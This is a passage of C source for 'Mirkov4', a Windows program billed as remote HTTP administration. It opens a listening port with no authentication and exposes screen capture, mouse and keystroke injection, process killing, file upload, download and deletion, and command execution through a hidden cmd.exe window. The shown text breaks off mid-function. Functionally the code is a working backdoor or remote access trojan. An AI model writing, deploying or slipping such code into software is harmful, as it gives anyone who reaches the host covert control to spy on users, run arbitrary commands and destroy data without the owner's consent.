/*
 *  Mirkov4 -- remote http administration
 *
 *  Copyright (C) 2005  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#pragma comment( lib, "ws2_32.lib" )
#pragma comment( lib, "src/psapi.lib" )
#pragma comment( lib, "src/zlib.lib" )
#pragma comment( lib, "src/libzip.lib" )
#pragma comment( lib, "src/libpng.lib" )

#define _VERSION_MAJOR 1
#define _VERSION_MINOR 1

#define _DEFAULT_PORT 7887

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif

#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <sys/stat.h>
#include "psapi.h"
#include <fcntl.h>
#include <io.h>

#include "png.h"
#include "zip.h"

#define HTTP_HEADERS    \
                        \
"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n<HTML>\r\n<HEAD>"  \
"\r\n  <TITLE>Mirkov4 - %s@%s</TITLE>\r\n  <STYLE TYPE=\"text/css\""  \
">\r\n    PRE { font-size: 13pt }\r\n    A:link    { text-decoratio"  \
"n: none; color: #000080; }\r\n    A:visited { text-decoration: non"  \
"e; color: #000080; }\r\n    A:hover   { text-decoration: none; col"  \
"or: #008000; }\r\n    A:active  { text-decoration: none; color: #0"  \
"08000; }\r\n  </STYLE>\r\n</HEAD>\r\n<BODY>\r\n<PRE>\r\n\r\n  <A H"  \
"REF=\"/\">Mirkov4 v%d.%d -- remote http administration</A>\r\n\r\n", \
    username, hostname, _VERSION_MAJOR, _VERSION_MINOR

#define cleanup(x)              \
{                               \
    shutdown( client_fd, 2 );   \
    closesocket( client_fd );   \
    ExitThread(x);              \
}

#define ERR_NO_ERROR            0
#define ERR_INVALID_ACTION      1
#define ERR_INVALID_URL         2
#define ERR_CONN_TIMEOUT        3
#define ERR_RECV_FAILED         4
#define ERR_SEND_FAILED         5
#define ERR_MALLOC_FAILED       6
#define ERR_OPEN_FAILED         7
#define ERR_CREAT_FAILED        8
#define ERR_SHIT_HAPPENS        9
#define ERR_GDI_FAILED         10
#define ERR_FIND_FAILED        11
#define ERR_PIPE_FAILED        12
#define ERR_OPEN_PROCESS       13
#define ERR_CREATE_PROCESS     14
#define ERR_FORM_ERROR         15

char *sterr[] =
{
    "no error",
    "invalid action",
    "invalid url",
    "connection timeout",
    "recv() failed",
    "send() failed",
    "malloc() failed",
    "_open() failed",
    "_creat() failed",
    "yeah, shit happens",
    "some GDI problem",
    "FindFirstFile failed",
    "CreatePipe failed",
    "OpenProcess failed",
    "CreateProcess failed",
    "invalid form data"
};

char username[128];
char hostname[128];
char wversion[128];
char cpuinfo[128];

/* screenshot global data */

struct screenshot
{
    HANDLE sem;
    int width;
    int height;
    unsigned char *bytes_tn;    /* thumbnail */
    unsigned char *bytes_fs;    /* full size */
    unsigned char **rows_tn;
    unsigned char **rows_fs;
}
shot;

/* function declaration */

void client_thread(  int client_fd );
int startup_page(    int client_fd, char buf[3][2048] );
int screenshot_page( int client_fd, char buf[3][2048] );
int grab_screen(     int client_fd, char buf[3][2048] );
int click_mouse(     int client_fd, char buf[3][2048] );
int keyboard_press(  int client_fd, char buf[3][2048] );
int kill_process(    int client_fd, char buf[3][2048] );
int exec_command(    int client_fd, char buf[3][2048] );
int delete_stuff(    int client_fd, char buf[3][2048] );
int file_shredder(   int client_fd, char buf[3][2048] );
int recursive_del(   int client_fd, char buf[3][2048] );
int list_files(      int client_fd, char buf[3][2048] );
int download_file(   int client_fd, char buf[3][2048] );
int upload_file(     int client_fd, char buf[3][2048], int length );

void GetCPUInfo( char *buffer );

/* program entry point */

int __stdcall WinMain( HINSTANCE hInstance,
                       HINSTANCE hPrevInstance,
                       LPSTR lpCmdLine,
                       int nShowCmd )
{
    char *p;
    OSVERSIONINFO ovi;
    WSADATA wsaData;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n, tid, client_fd, server_fd;
    unsigned short server_port;

    /* setup the global data */

    n = sizeof( username );
    memset( username, 0, n );
    GetUserName( username, &n );

    n = sizeof( hostname );
    memset( hostname, 0, n );
    GetComputerName( hostname, &n );

    ovi.dwOSVersionInfoSize = sizeof( ovi );
    GetVersionEx( &ovi );
    sprintf( wversion, "Windows %d.%d",
             ovi.dwMajorVersion, ovi.dwMinorVersion );

    memset( cpuinfo, 0, sizeof( cpuinfo ) );
    GetCPUInfo( cpuinfo );

    memset( &shot, 0, sizeof( shot ) );
    shot.sem = CreateSemaphore( NULL, 1, 0, NULL );

    /* parse the argument */

    p = GetCommandLine();

    if( p[0] == '"' )
    {
        p++;
        while( 1 ) {
            if( p[0] == '"' || p[0] == '\0' ) break;
            p++;
        }

        if( p[0] == '"' )
            p++;
    }
    else
    {
        while( 1 ) {
            if( p[0] == ' ' || p[0] == '\0' ) break;
            p++;
        }
    }

    if( p[0] == ' ' )
        p++;

    server_port = atoi( p ) ? atoi( p ) : _DEFAULT_PORT;
    
    /* setup the socket and start listening */

    if( WSAStartup( MAKEWORD(2,0), &wsaData ) == SOCKET_ERROR )
        return( 0 );

    server_fd = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_IP,
                           NULL, 0, 0 );

    if( server_fd < 0 )
        return( 0 );

    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons( server_port );
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if( bind( server_fd, (struct sockaddr *) &server_addr,
              sizeof( server_addr ) ) < 0 )
        return( 0 );

    if( listen( server_fd, 10 ) != 0 )
        return( 0 );

    /* wait for inboud connections */

    while( 1 )
    {
        n = sizeof( client_addr );

        if( ( client_fd = accept( server_fd,
                (struct sockaddr *) &client_addr, &n ) ) < 0 )
            return( 0 );

        /* spawn a thread to handle the connection */

        CloseHandle( CreateThread(
            NULL, 0, (LPTHREAD_START_ROUTINE)
            client_thread, (void *) client_fd, 0, &tid ) );
    }

    /* not reached */

    return( -1 );
}

void client_thread( int client_fd )
{
    char buf[3][2048];
    int i, j, m, n, retval;
    struct timeval timeout;
    fd_set rfds;

    /* fetch the http request headers, timeout is 5 seconds */

    FD_ZERO( &rfds );
    FD_SET( (unsigned int) client_fd, &rfds );

    timeout.tv_sec  = 5;
    timeout.tv_usec = 0;

    if( select( client_fd + 1, &rfds, NULL, NULL, &timeout ) <= 0 )
        cleanup( ERR_CONN_TIMEOUT );

    memset( buf[0], 0, sizeof( buf[0] ) );

    m = recv( client_fd, buf[0], sizeof( buf[0] ) - 1, 0 );
 
    if( m <= 0 ) cleanup( ERR_RECV_FAILED );

    /* make sure the http method is valid */

    i = 5;
    if( memcmp( buf[0], "GET ", 4 ) != 0 )
    {
        i = 6;
        if( memcmp( buf[0], "HEAD ", 5 ) != 0 &&
            memcmp( buf[0], "POST ", 5 ) != 0 )
            cleanup( ERR_INVALID_URL );
    }

    /* now decode any %XX into the pathnames:
       buf[1] has the pathname with slashes and
       buf[2] has the pathname with backslashes */

    j = 0;

    memset( buf[1], 0, sizeof( buf[1] ) );
    memset( buf[2], 0, sizeof( buf[2] ) );

    while( memcmp( buf[0] + i, " HTTP/1.0\r\n", 11 ) != 0 &&
           memcmp( buf[0] + i, " HTTP/1.1\r\n", 11 ) != 0 )
    {
        if( buf[0][i] == '\0' || i >= 1024 )
            cleanup( ERR_INVALID_URL );

        if( buf[0][i] == '%' )
        {
            buf[0][i    ] = buf[0][i + 1];
            buf[0][i + 1] = buf[0][i + 2];
            buf[0][i + 2] = 0;
            sscanf( buf[0] + i, "%x", &n );
            i += 2; buf[0][i] = n;
        }

        buf[1][j] = buf[0][i];
        buf[2][j] = buf[0][i];

        if( buf[2][j] == '/' )
            buf[2][j] = '\\';

        i++; j++;
    }

    /* remove any trailing slash */

    n = strlen( buf[1] );

    if( buf[1][n - 1] == '/' )
        buf[1][n - 1] = '\0';

    /* now check the target */

    retval = ERR_INVALID_ACTION;

    if( strcmp( buf[1], "" ) == 0 )
        retval = startup_page( client_fd, buf );

    if( strcmp( buf[1], "_SHOT" ) == 0 )
        retval = screenshot_page( client_fd, buf );

    if( memcmp( buf[1], "_GRAB?i=", 8 ) == 0 )
        retval = grab_screen( client_fd, buf );

    if( memcmp( buf[1], "_CLIC?b=", 8 ) == 0 )
        retval = click_mouse( client_fd, buf );

    if( memcmp( buf[1], "_KEYB?k=", 8 ) == 0 )
        retval = keyboard_press( client_fd, buf );

    if( memcmp( buf[1], "_KILL?p=", 8 ) == 0 )
        retval = kill_process( client_fd, buf );

    if( memcmp( buf[1], "_EXEC?c=", 8 ) == 0 )
        retval = exec_command( client_fd, buf );

    if( memcmp( buf[1], "_DELE?p=", 8 ) == 0 )
        retval = delete_stuff( client_fd, buf );

    if( memcmp( buf[1], "_LIST?d=", 8 ) == 0 )
        retval = list_files( client_fd, buf );

    if( memcmp( buf[1], "_UPLD?d=", 8 ) == 0 )
        retval = upload_file( client_fd, buf, m );

    if( retval == ERR_INVALID_ACTION )
        retval = download_file( client_fd, buf );

    if( retval > 0 )
    {
        sprintf( buf[0], "ERROR #%02d: %s\r\n", retval, sterr[retval] );
        send( client_fd, buf[0], strlen( buf[0] ), 0 );
    }

    cleanup( retval );
}

int startup_page( int client_fd, char buf[3][2048] )
{
    int i, n, nPid;
    char *p, base[64];
    SYSTEM_INFO si;
    MEMORYSTATUS ms;
    DWORD pidTbl[512];
    HANDLE hProc;
    HMODULE hMod;
    PROCESS_MEMORY_COUNTERS pmc;
    FILETIME t_create, t_exit;
    FILETIME t_kernel, t_user;
    LARGE_INTEGER li1, li2;

    sprintf( buf[0], HTTP_HEADERS );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* display system information */

    GetSystemInfo( &si );
    GlobalMemoryStatus( &ms );

    sprintf( buf[0], "  %d CPU -- %s\r\n\r\n  %s -- %4dM total m"
                     "emory, %4dM available (load: %2d%%)\r\n\r\n",
                     si.dwNumberOfProcessors, cpuinfo, wversion,
                     ms.dwTotalPhys / ( 1024 * 1024 ),
                     ms.dwAvailPhys / ( 1024 * 1024 ), ms.dwMemoryLoad );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* show a list of drives */

    for( i = 'A'; i <= 'Z'; i++ )
    {
        sprintf( buf[0], "%c:\\", i );

        if( ( n = GetDriveType( buf[0] ) ) == DRIVE_UNKNOWN )
            continue;

        switch( n )
        {
            case DRIVE_REMOTE:    p = "Network drive";   break;
            case DRIVE_CDROM:     p = "CD-ROM drive";    break;
            case DRIVE_FIXED:     p = "Disk drive";      break;
            case DRIVE_REMOVABLE: p = "Removable drive"; break;
            default: continue;
        }

        sprintf( buf[0], "  <A HREF=\"/_LIST?d=%c:/\">%C:\\   %-34s</A>\r\n",
                 i, i, p );

        if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                               (int) strlen( buf[0] ) )
            return( ERR_SEND_FAILED );
    }

    /* display shrinked image of screen */

    sprintf( buf[0], "\r\n  <A HREF=\"_SHOT\"><IMG SRC=\"/"
                     "_GRAB?i=1\" BORDER=\"0\"></A>\r\n\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* display the running processes */

    EnumProcesses( pidTbl, sizeof( pidTbl ), &nPid );
    nPid /= sizeof( DWORD );

    for( i = 0; i < nPid; i++ )
    {
        pmc.WorkingSetSize = 0;
        
        memset( &t_kernel, 0, sizeof( FILETIME ) );
        memset( &t_user,   0, sizeof( FILETIME ) );

        if( ! ( hProc = OpenProcess( PROCESS_QUERY_INFORMATION |
                                     PROCESS_VM_READ, FALSE,
                                     pidTbl[i] ) ) )
            continue;

        GetProcessMemoryInfo( hProc, &pmc, sizeof( pmc ) );
        GetProcessTimes( hProc, &t_create, &t_exit,
                                &t_kernel, &t_user );

        EnumProcessModules( hProc, &hMod, sizeof( hMod ), &n );
        memset( base, 0, n = sizeof( base ) );
        GetModuleBaseName( hProc, hMod, base, n - 1 );

        CloseHandle( hProc );

        if( strlen( base ) > 30 )
        {
            base[27] = '.'; base[28] = '.';
            base[29] = '.'; base[30] = 0;
        }

        li1.LowPart  = t_kernel.dwLowDateTime;
        li1.HighPart = t_kernel.dwHighDateTime;
        li2.LowPart  = t_user.dwLowDateTime;
        li2.HighPart = t_user.dwHighDateTime;
        li1.QuadPart += li2.QuadPart;
        li1.QuadPart /= 10000000;

        sprintf( buf[0], "  <A HREF=\"/_KILL?p=%d\">xx</A> %5d"
                         " %5ds  %6dK  %-30s\r\n",
                         pidTbl[i], pidTbl[i],
                         (int) li1.QuadPart,
                         pmc.WorkingSetSize / 1024,
                         base );

        if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                               (int) strlen( buf[0] ) )
            return( ERR_SEND_FAILED );
    }

    sprintf( buf[0], "</PRE>\r\n</BODY>\r\n</HTML>\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

int screenshot_page( int client_fd, char buf[3][2048] )
{
    sprintf( buf[0], HTTP_HEADERS );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* ph34r */

    sprintf( buf[0], "<FORM ACTION=\"/_KEYB\" METHOD=\"GET\">  <INPUT TYPE"
                     "=\"text\" SIZE=\"54\" NAME=\"k\"><INPUT TYPE=\"submi"
                     "t\" VALUE=\"Send keys\"> <A HREF=\"#help\">Help</A>"
                     "\r\n\r\n  Mouse actions: s = left, d = dbl click, f = "
                     "right\r\n</FORM>\r\n"

                     "<A HREF=\"/_SHOT\"><IMG STYLE=\"position: relative\""
                     "SRC=\"/_GRAB?i=0\" BORDER=\"0\"></A>\r\n"

                     "<SCRIPT TYPE=\"text/javascript\">\r\nvar px, py;\r\n"
                     "document.images[0].onmouseout  = mo;\r\ndocument.ima"
                     "ges[0].onmousemove = mm;\r\ndocument.onkeydown = kd;"
                     "\r\nfunction mo(e) {\r\n    px = py = 0;\r\n}\r\nfun"
                     "ction mm(e) {\r\n    if (!e) var e = window.event;\r"
                     "\n    if (e.x || e.y) { px = e.x; py = e.y; }\r\n   "
                     " else if (e.layerX || e.layerY) { px = e.layerX; py "
                     "= e.layerY; }\r\n}\r\nfunction kd(e) {\r\n    if (!e"
                     ") var e = window.event;\r\n    if (px == 0 || py == "
                     "0) return;\r\n    var c = String.fromCharCode(e.keyC"
                     "ode);\r\n    if (c == 'S') self.location.replace('/_"
                     "CLIC?b=1&x='+px+'&y='+py);\r\n    if (c == 'D') self"
                     ".location.replace('/_CLIC?b=2&x='+px+'&y='+py);\r\n "
                     "   if (c == 'F') self.location.replace('/_CLIC?b=3&x"
                     "='+px+'&y='+py);\r\n}\r\n</SCRIPT>\r\n"

                     "<A NAME=\"help\"></A>Modifiers: [C] Ctrl [W] Windows"
                     " [A] Alt [S] Shift || Special keys: [T] Tab\r\n[E] E"
                     "nter [B] Backspace [Q] Escape [1]..[12] F1..F12 [I] "
                     "Insert [X] Delete\r\n[U] Up [D] Down [L] Left [R] Ri"
                     "ght [N] Num Lock [P] Caps Lock [L] Scrl.lck\r\n[-] H"
                     "ome [+] End [:] Release modifier || #xx? Repeat key "
                     "(example: #07[B])\r\n\r\nNote: sending Ctrl-Alt-Del "
                     "or Alt-Tab will not work because of Explorer.exe"

                     "</PRE>\r\n</BODY>\r\n</HTML>\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

void user_write_data( png_structp png_ptr, png_bytep data, png_size_t length )
{
    send( (SOCKET) png_ptr->io_ptr, data, length, 0 );
}

void user_flush_data( png_structp png_ptr )
{
}

int grab_screen( int client_fd, char buf[3][2048] )
{
    FILE *f         = NULL;
    HDC hsDC        = NULL;
    HDC hdDC        = NULL;
    HBITMAP hBMP    = NULL;
    BITMAPINFO BI;

    png_struct *pstr;
    png_info *pinf;
    int width, height;
    int i, j, k, u, v;
    int retval, icon;

    icon = atoi( buf[1] + 8 );

    WaitForSingleObject( shot.sem, INFINITE );

   /* initial data setup */

    if( ( hsDC = GetDC( NULL ) ) == NULL )
        return( ERR_GDI_FAILED );

    width  = GetDeviceCaps( hsDC, HORZRES );
    height = GetDeviceCaps( hsDC, VERTRES );

    if( shot.width  != width  ||
        shot.height != height )
    {
        if( shot.bytes_tn != NULL ) free( shot.bytes_tn );
        if( shot.bytes_fs != NULL ) free( shot.bytes_fs );
        if( shot.rows_tn  != NULL ) free( shot.rows_tn  );
        if( shot.rows_fs  != NULL ) free( shot.rows_fs  );

        retval = ERR_MALLOC_FAILED;

        if( ( shot.bytes_tn = malloc( (
                width * height * 3 ) / 16 ) ) == NULL )
            goto png_exit;

        if( ( shot.bytes_fs = malloc(
                width * height * 3 ) ) == NULL )
            goto png_exit;

        if( ( shot.rows_tn = malloc( (
                height * sizeof( unsigned char* ) ) / 4 ) ) == NULL )
            goto png_exit;
    
        if( ( shot.rows_fs = malloc(
                height * sizeof( unsigned char* ) ) ) == NULL )
            goto png_exit;
    
        shot.width  = width;
        shot.height = height;
    }

    /* create the destination DC & bitmap */

    retval = ERR_GDI_FAILED;

    hBMP = CreateCompatibleBitmap( hsDC, shot.width, shot.height );

    if( hBMP == NULL )
        goto png_exit;

    if( ( hdDC = CreateCompatibleDC( hsDC ) ) == NULL )
        goto png_exit;

    /* copy desktop pixels into bitmap, get the bits */

    memset( &BI, 0, sizeof( BI ) );

    BI.bmiHeader.biSize     = sizeof( BI.bmiHeader );
    BI.bmiHeader.biWidth    = shot.width;
    BI.bmiHeader.biHeight   = shot.height;
    BI.bmiHeader.biPlanes   = 1;
    BI.bmiHeader.biBitCount = 24;

    if( SelectObject( hdDC, hBMP ) == NULL )
        goto png_exit;

    if( BitBlt( hdDC, 0, 0, shot.width, shot.height,
                hsDC, 0, 0, SRCCOPY ) == 0 )
        goto png_exit;

    if( GetDIBits( hdDC, hBMP, 0, shot.height, shot.bytes_fs,
                   &BI, DIB_RGB_COLORS ) != shot.height )
        goto png_exit;

    /* setup the png data row pointers */

    if( icon )
    {
        int B, G, R;
        width  /= 4;
        height /= 4;

        /* shrink the image to 25% of its size */

        for( j = 0, k = height - 1; j < height; j++, k-- )
        {
            for( i = 0; i < width * 3; i +=3 )
            {
                B = G = R = 0;

                for( v = j * 4; v < (j + 1) * 4; v++ )
                {
                    for( u = i * 4; u < (i + 3) * 4; u += 3 )
                    {
                        B += shot.bytes_fs[    u + v * shot.width * 3];
                        G += shot.bytes_fs[1 + u + v * shot.width * 3];
                        R += shot.bytes_fs[2 + u + v * shot.width * 3];
                    }
                }

                shot.bytes_tn[    i + j * width * 3] = B / 16;
                shot.bytes_tn[1 + i + j * width * 3] = G / 16;
                shot.bytes_tn[2 + i + j * width * 3] = R / 16;
             }

	    shot.rows_tn[j] = shot.bytes_tn + k * width * 3;
        }

    }
    else
        for( j = 0, k = height - 1; j < height; j++, k-- )
	    shot.rows_fs[j] = shot.bytes_fs + k * width * 3;

    /* finally write the png */

    if( send( client_fd, "HTTP/1.0 200 OK\r\nContent-Type: "
                         "image/png\r\n\r\n", 44, 0 ) != 44 )
        return( ERR_SEND_FAILED );

    pstr = png_create_write_struct( PNG_LIBPNG_VER_STRING, 0, 0, 0 );
    pinf = png_create_info_struct( pstr );

    png_set_IHDR( pstr, pinf, width, height, 8,
                  PNG_COLOR_TYPE_RGB, 
                  PNG_INTERLACE_NONE,
                  PNG_COMPRESSION_TYPE_BASE,
                  PNG_FILTER_TYPE_BASE );

    png_set_bgr( pstr );

    png_set_write_fn( pstr, (void *) client_fd,
                      user_write_data, user_flush_data );

    png_write_info( pstr, pinf );
    png_write_image( pstr, ( icon ) ? shot.rows_tn : shot.rows_fs );
    png_write_end( pstr, pinf );
    png_destroy_write_struct( &pstr, &pinf );

    retval = 0;

png_exit:

    if( hsDC != NULL );
        ReleaseDC( NULL, hsDC );
    
    if( hdDC != NULL );
        ReleaseDC( NULL, hdDC );

    if( hBMP != NULL )
        DeleteObject( hBMP ); 

    ReleaseSemaphore( shot.sem, 1, NULL );

    return( retval );
}

/* send a mouse click (1/3) or double click (2) to the desktop */

int click_mouse( int client_fd, char buf[3][2048] )
{
    int m = 1, x = 0, y = 0, n = 0;
    INPUT ie;

    sscanf( buf[1], "_CLIC?b=%d&x=%d&y=%d", &m, &x, &y );
    SetCursorPos( x, y );

    memset( &ie, 0, sizeof( ie ) );
    ie.type = INPUT_MOUSE;

do_click:

    ie.mi.dwFlags = ( m != 3 ) ? MOUSEEVENTF_LEFTDOWN :
                                 MOUSEEVENTF_RIGHTDOWN;
    SendInput( 1, &ie, sizeof( INPUT ) );

    ie.mi.dwFlags = ( m != 3 ) ? MOUSEEVENTF_LEFTUP :
                                 MOUSEEVENTF_RIGHTUP;
    SendInput( 1, &ie, sizeof( INPUT ) );

    if( m == 2 && n++ == 0 )
        goto do_click;

    Sleep( 150 );

    sprintf( buf[0], "HTTP/1.0 302 Found\r\nLocation: /_SHOT\r\n\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

/* send a batch of keypress to the desktop */

int keyboard_press( int client_fd, char buf[3][2048] )
{
    INPUT ie[2];
    int i, keycode;
    int count, modifier;
    char *p = buf[2] + 8;

    memset( &ie, 0, sizeof( ie ) );
    ie[0].type = INPUT_KEYBOARD;
    ie[1].type = INPUT_KEYBOARD;
    ie[1].ki.dwFlags = KEYEVENTF_KEYUP;

    count = 1;
    modifier = 0;

    while( *p != 0 )
    {
        keycode = VkKeyScan( *p );

        if( p[0] == '#' && p[1] >= '0' && p[1] <= '9' &&
                           p[2] >= '0' && p[2] <= '9' )
        {
            /* repeat the key */

            char tmp[3];
            tmp[0] = p[1];
            tmp[1] = p[2];
            tmp[2] = 0;
            count = atoi( tmp );
            p += 3;
            continue;
        }

        /* look for a modifier / special key */

        if( ! memcmp( p, "[10]", 4 ) ) { keycode = VK_F10; p += 3; }
        if( ! memcmp( p, "[11]", 4 ) ) { keycode = VK_F11; p += 3; }
        if( ! memcmp( p, "[12]", 4 ) ) { keycode = VK_F12; p += 3; }

        if( p[0] == '[' && p[1] != 0 && p[2] == ']' )
        {
            keycode = 0;

            if( p[1] >= 'a' && p[1] <= 'z' )
                p[1] &= 0xDF;

            switch( p[1] )
            {
            case ':': modifier  =      0; p += 3; continue;
            case 'S': modifier |= 0x0100; p += 3; continue;
            case 'C': modifier |= 0x0200; p += 3; continue;
            case 'A': modifier |= 0x0400; p += 3; continue;
            case 'W': modifier |= 0x4000; p += 3; continue;

            case 'T': keycode = VK_TAB;     break;
            case 'E': keycode = VK_RETURN;  break;
            case 'B': keycode = VK_BACK;    break;
            case 'Q': keycode = VK_ESCAPE;  break;
            case '1': keycode = VK_F1;      break;
            case '2': keycode = VK_F2;      break;
            case '3': keycode = VK_F3;      break;
            case '4': keycode = VK_F4;      break;
            case '5': keycode = VK_F5;      break;
            case '6': keycode = VK_F6;      break;
            case '7': keycode = VK_F7;      break;
            case '8': keycode = VK_F8;      break;
            case '9': keycode = VK_F9;      break;
            case 'I': keycode = VK_INSERT;  break;
            case 'X': keycode = VK_DELETE;  break;
            case 'U': keycode = VK_UP;      break;
            case 'D': keycode = VK_DOWN;    break;
            case 'L': keycode = VK_LEFT;    break;
            case 'R': keycode = VK_RIGHT;   break;
            case 'N': keycode = VK_NUMLOCK; break;
            case 'P': keycode = VK_CAPITAL; break;
            case 'O': keycode = VK_SCROLL;  break;
            case '-': keycode = VK_HOME;    break;
            case '+': keycode = VK_END;     break;
            default: continue;
            }

            p += 2;
        }

        p++;

        for( i = 0; i < count; i++ )
        {
            /* press any required modifier */

            if( ( keycode | modifier ) & 0x0100 )
            {
                ie[0].ki.wVk = VK_SHIFT;
                SendInput( 1, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x0200 )
            {
                ie[0].ki.wVk = VK_CONTROL;
                SendInput( 1, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x0400 )
            {
                ie[0].ki.wVk = VK_MENU;
                SendInput( 1, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x4000 )
            {
                ie[0].ki.wVk = VK_LWIN;
                SendInput( 1, ie, sizeof( INPUT ) );
            }

            ie[0].ki.wVk = keycode & 0xFF;
            ie[1].ki.wVk = keycode & 0xFF;
            SendInput( 2, ie, sizeof( INPUT ) );

            ie[0].ki.wVk = 0;

            /* make sure to release the modifiers */

            if( ( keycode | modifier ) & 0x0100 )
            {
                ie[1].ki.wVk = VK_SHIFT;
                SendInput( 2, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x0200 )
            {
                ie[1].ki.wVk = VK_CONTROL;
                SendInput( 2, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x0400 )
            {
                ie[1].ki.wVk = VK_MENU;
                SendInput( 2, ie, sizeof( INPUT ) );
            }
            if( ( keycode | modifier ) & 0x4000 )
            {
                ie[1].ki.wVk = VK_LWIN;
                SendInput( 2, ie, sizeof( INPUT ) );
            }
        }

        count = 1;
    }

    ie[0].ki.wVk = 0;
    ie[1].ki.wVk = VK_SHIFT;   SendInput( 2, ie, sizeof( INPUT ) );
    ie[1].ki.wVk = VK_CONTROL; SendInput( 2, ie, sizeof( INPUT ) );
    ie[1].ki.wVk = VK_MENU;    SendInput( 2, ie, sizeof( INPUT ) );
    ie[1].ki.wVk = VK_LWIN;    SendInput( 2, ie, sizeof( INPUT ) );

    Sleep( 150 );

    sprintf( buf[0], "HTTP/1.0 302 Found\r\nLocation: /_SHOT\r\n\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

int kill_process( int client_fd, char buf[3][2048] )
{
    int procId;
    HANDLE hProc;

    sscanf( buf[1] + 8, "%d", &procId );
    if( ! ( hProc = OpenProcess( PROCESS_TERMINATE, FALSE, procId ) ) )
        return( ERR_OPEN_PROCESS );

    TerminateProcess( hProc, 0 );
    CloseHandle( hProc );

    sprintf( buf[0], "HTTP/1.0 302 Found\r\nLocation: /\r\n\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

int exec_command( int client_fd, char buf[3][2048] )
{
    int n;
    char *p;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    SECURITY_ATTRIBUTES sa;
    HANDLE hOutRead, hOutWrite;

    sprintf( buf[0], "HTTP/1.0 200 OK\r\nContent-Type:"
                     " text/plain\r\n\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* change + to spaces */

    p = buf[1];
    while( *p != 0 )
    {
        if( *p == '+' ) *p = ' ';
        p++;
    }

    /* separate command and dir. args */

    p = strstr( buf[1] + 8, "&d=" );
    if( p == NULL )
        return( ERR_INVALID_URL );
    *p = 0;

    /* setup the current dir. */

    p = strstr( buf[2] + 8, "&d=" );

    if( p != NULL )
    {
        buf[2][strlen( buf[2] ) + 1] = '\0';
        buf[2][strlen( buf[2] )    ] = '\\';
        SetCurrentDirectory( p + 3 );
    }

    /* setup the stdout/stderr pipe */

    sa.nLength = sizeof( SECURITY_ATTRIBUTES );
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if( CreatePipe( &hOutRead, &hOutWrite, &sa, 0 ) == 0 )
        return( ERR_PIPE_FAILED );

    /* launch the process */

    GetStartupInfo( &sinfo );

    sinfo.dwFlags       = STARTF_USESTDHANDLES
                        | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow   = SW_HIDE;

    sinfo.hStdInput     = (void *) GetStdHandle( STD_INPUT_HANDLE );
    sinfo.hStdOutput    = (void *) hOutWrite;
    sinfo.hStdError     = (void *) hOutWrite;

    GetSystemDirectory( buf[2], MAX_PATH );

    sprintf( buf[0], "%s\\cmd.exe", buf[2] );
    memcpy( buf[1] + 5, "/c ", 3 );

    if( ! CreateProcess( buf[0], buf[1] + 5, NULL, NULL, TRUE,
        CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo ) )
        return( ERR_CREATE_PROCESS );

    CloseHandle( pinfo.hProcess );
    CloseHandle( hOutWrite );

    while( 1 )
    {
        /* relay the data until child exits */

        ReadFile( hOutRead, buf[0], 1, &n, NULL );

        if( n == 0 )
            break;

        if( send( client_fd, buf[0], n, 0 ) != n )
            return( ERR_SEND_FAILED );
    }

    CloseHandle( hOutRead );

    return( ERR_NO_ERROR );
}

int delete_stuff( int client_fd, char buf[3][2048] )
{
    int i, retval;

    sprintf( buf[0], HTTP_HEADERS );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
